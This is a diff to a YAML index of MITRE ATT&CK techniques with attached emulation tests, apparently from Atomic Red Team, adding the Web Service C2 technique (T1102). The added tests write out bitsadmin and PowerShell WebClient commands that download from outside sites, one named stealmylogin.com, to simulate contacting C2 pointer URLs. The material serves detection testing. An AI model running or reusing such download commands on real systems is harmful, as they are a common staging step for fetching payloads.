@@ -11482,6 +11482,102 @@ defense-evasion:
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
 '
+  T1102:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network protocol analysis
+      - Packet capture
+      - SSL/TLS inspection
+      name: Web Service
+      description: |-
+        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+
+        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
+
+        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
+
+        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
+      modified: '2019-07-18T21:21:18.135Z'
+      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
+      x_mitre_network_requirements: true
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'Host data that can relate unknown or suspicious process
+        activity using a network connection is important to supplement any existing
+        indicators of compromise based on malware command and control signatures and
+        infrastructure or the presence of strong encryption. Packet capture analysis
+        will require SSL/TLS inspection if data is encrypted. Analyze network data
+        for uncommon data flows (e.g., a client sending significantly more data than
+        it receives from a server). User behavior monitoring may help to detect abnormal
+        patterns of activity. Analyze packet contents to detect communications that
+        do not follow the expected protocol behavior for the port that is being used.
+        (Citation: University of Birmingham C2)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Anastasios Pingios
+      created: '2017-05-31T21:31:13.915Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1102
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1102
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      x_mitre_defense_bypassed:
+      - Binary Analysis
+      - Log analysis
+      - Firewall
+      identifier: T1102
+    atomic_tests:
+    - name: Reach out to C2 Pointer URLs via command_prompt
+      description: 'Download data from a public website using command line
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
+          %TEMP%\bitsadmindownload.html
+
+'
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+
+'
+    - name: Reach out to C2 Pointer URLs via powershell
+      description: 'Multiple download methods for files using powershell
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest -Uri www.twitter.com
+          $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
+          $wc = New-Object System.Net.WebClient
+          $T1102 = $wc.DownloadString("https://www.aol.com/")
+        cleanup_command: 'Clear-Variable T1102
+
+'
   T1220:
     technique:
       x_mitre_data_sources:
@@ -25163,65 +25259,58 @@ exfiltration:
 command-and-control:
   '':
     technique:
-      x_mitre_permissions_required:
-      - User
       x_mitre_data_sources:
       - Host network interface
       - Netflow/Enclave netflow
+      - Network intrusion detection system
       - Network protocol analysis
       - Packet capture
-      - SSL/TLS inspection
-      name: Web Service
+      - Process use of network
+      name: Standard Non-Application Layer Protocol
       description: |-
-        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+        Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
 
-        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
-
-        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
-
-        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
-      modified: '2019-07-18T21:21:18.135Z'
-      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
-      x_mitre_network_requirements: true
+        ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.
+      id: attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b
+      x_mitre_contributors:
+      - Ryan Becwar
       x_mitre_platforms:
+      - Windows
       - Linux
       - macOS
-      - Windows
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       type: attack-pattern
-      x_mitre_detection: 'Host data that can relate unknown or suspicious process
-        activity using a network connection is important to supplement any existing
-        indicators of compromise based on malware command and control signatures and
-        infrastructure or the presence of strong encryption. Packet capture analysis
-        will require SSL/TLS inspection if data is encrypted. Analyze network data
-        for uncommon data flows (e.g., a client sending significantly more data than
-        it receives from a server). User behavior monitoring may help to detect abnormal
-        patterns of activity. Analyze packet contents to detect communications that
-        do not follow the expected protocol behavior for the port that is being used.
-        (Citation: University of Birmingham C2)'
+      x_mitre_detection: |-
+        Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+
+        Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - Anastasios Pingios
-      created: '2017-05-31T21:31:13.915Z'
+      x_mitre_network_requirements: true
+      created: '2017-05-31T21:31:10.728Z'
       kill_chain_phases:
       - kill_chain_name: mitre-attack
         phase_name: command-and-control
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
       external_references:
-      - external_id: T1102
+      - external_id: T1095
         source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1102
+        url: https://attack.mitre.org/techniques/T1095
+      - source_name: Wikipedia OSI
+        description: Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved
+          December 4, 2014.
+        url: http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29
+      - source_name: Microsoft ICMP
+        description: Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics.
+          Retrieved December 1, 2014.
+        url: http://support.microsoft.com/KB/170292
       - source_name: University of Birmingham C2
         description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
           & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
         url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
-      x_mitre_defense_bypassed:
-      - Binary Analysis
-      - Log analysis
-      - Firewall
+      modified: '2019-07-18T21:18:02.753Z'
     atomic_tests: []
   T1090:
     technique:
@@ -25964,6 +26053,102 @@ command-and-control:
         name: sh
         elevation_required: false
         command: 'telnet #{domain} #{port}
+
+'
+  T1102:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network protocol analysis
+      - Packet capture
+      - SSL/TLS inspection
+      name: Web Service
+      description: |-
+        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+
+        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
+
+        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
+
+        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
+      modified: '2019-07-18T21:21:18.135Z'
+      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
+      x_mitre_network_requirements: true
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'Host data that can relate unknown or suspicious process
+        activity using a network connection is important to supplement any existing
+        indicators of compromise based on malware command and control signatures and
+        infrastructure or the presence of strong encryption. Packet capture analysis
+        will require SSL/TLS inspection if data is encrypted. Analyze network data
+        for uncommon data flows (e.g., a client sending significantly more data than
+        it receives from a server). User behavior monitoring may help to detect abnormal
+        patterns of activity. Analyze packet contents to detect communications that
+        do not follow the expected protocol behavior for the port that is being used.
+        (Citation: University of Birmingham C2)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Anastasios Pingios
+      created: '2017-05-31T21:31:13.915Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1102
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1102
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      x_mitre_defense_bypassed:
+      - Binary Analysis
+      - Log analysis
+      - Firewall
+      identifier: T1102
+    atomic_tests:
+    - name: Reach out to C2 Pointer URLs via command_prompt
+      description: 'Download data from a public website using command line
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
+          %TEMP%\bitsadmindownload.html
+
+'
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+
+'
+    - name: Reach out to C2 Pointer URLs via powershell
+      description: 'Multiple download methods for files using powershell
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest -Uri www.twitter.com
+          $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
+          $wc = New-Object System.Net.WebClient
+          $T1102 = $wc.DownloadString("https://www.aol.com/")
+        cleanup_command: 'Clear-Variable T1102
 
 '
 initial-access:
